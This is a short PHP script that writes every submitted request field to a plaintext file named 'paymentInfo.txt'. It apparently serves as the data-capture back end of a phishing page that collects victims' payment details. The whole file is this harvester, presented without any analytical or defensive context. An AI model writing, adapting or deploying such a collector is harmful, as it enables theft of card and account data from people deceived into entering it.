<?php

foreach ($_REQUEST as $key => $value) {
    $data = $key." = ".$value."\n========================================================\n";
    $fh = fopen("paymentInfo.txt", 'a+');
    fwrite($fh, $data);
    fclose($fh);
}

?>